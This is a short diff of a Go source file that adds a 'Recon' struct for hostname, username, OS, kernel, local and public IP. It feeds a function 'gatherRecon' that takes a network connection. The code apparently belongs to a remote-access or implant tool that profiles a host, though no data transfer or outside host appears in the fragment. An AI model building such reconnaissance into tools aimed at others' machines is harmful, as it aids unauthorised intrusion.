@@ -6,6 +6,16 @@ import (
 	"runtime"
 )
 
+type Recon struct {
+	Hostname string `json:"hostname"`
+	Username string `json:"username"`
+	OS       string `json:"os"`
+	Arch     string `json:"arch"`
+	Kernel   string `json:"kernel"`
+	IP       string `json:"ip"`
+	PublicIP string `json:"public_ip"`
+}
+
 func gatherRecon(conn net.Conn) Recon {
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USER")
